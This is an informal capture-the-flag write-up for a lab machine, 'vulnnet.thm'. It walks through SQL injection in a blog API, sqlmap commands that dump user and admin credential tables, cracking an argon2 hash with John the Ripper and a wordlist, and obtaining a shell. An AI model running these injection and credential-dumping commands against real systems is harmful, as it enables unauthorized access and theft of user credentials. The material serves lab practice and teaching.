As we don't have creds will go a little back and see what we are able to find in the either api or blog post which seems sus to me.

BurpSuite Timeeeeeeeeeeeeeeeeeeeeee

As we clicked on the blog we got a link with API fetching some data
```
/vn_internals/api/v2/fetch/?blog=5
```
![[Pasted image 20231126232733.png]]

So the first thing comes to my mind is sql injection to check if it's vulnerable
![[Pasted image 20231126233147.png]]
So yes it is let's escalate and see what we can fetch

Let's run this directly as we don't have any luck trying different parameters.
```
http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
```
![[Pasted image 20231127191511.png]]

New trick that i learnt
```
 sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --tables
```
![[Pasted image 20231127191651.png]]

And we got 3 database here
```
blog, information_schema, vn_admin
```

I got a list of user and password but it don't seems anything interesting to me
```
sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D blog -T users --dump
```

```
/root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv
```

![[Pasted image 20231127193525.png]]

```
sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D vn_admin -T fe_users --dump
```
![[Pasted image 20231127193603.png]]

```
sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D vn_admin -T sys_vol --dump  
```
![[Pasted image 20231127193721.png]]


```
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --dbs -D vn_admin -T be_users --columns
```
![[Pasted image 20231127195705.png]]

```
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" --dbs -D vn_admin -T be_users -C username,password -dump
```
![[Pasted image 20231127195719.png]]

```
username,password

```

We can't crack it using Hashcat so our next best chance is Yes you guessed it right.
John Ripper and not John Wick hahhahahhaha

We have to provide the hash like this in order to JOHN to get working otherwise will get No password hashes loaded (see FAQ)

```
$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt argon_hash.txt
```

Let's format the password and usernames that we got above from the blog database
![[Pasted image 20231128113441.png]]

Simply copied the csv filed and formatted it using this
```
cat user_pass.csv | awk -F "\"*,\"*" '{print $3":"$2}'
```
So what we are doing is ignoring the 1st comma and rearranging the columns (i.e. taking columns 3 1st )
![[Pasted image 20231128113428.png]]

Now we can pass it in the john as a password list
So what i have done is that i have made a txt file for users and password differently

The site got hunged which indicated that we got a shell
![[Pasted image 20231128140750.png]]


We escalated from dumb shell to interactive shell
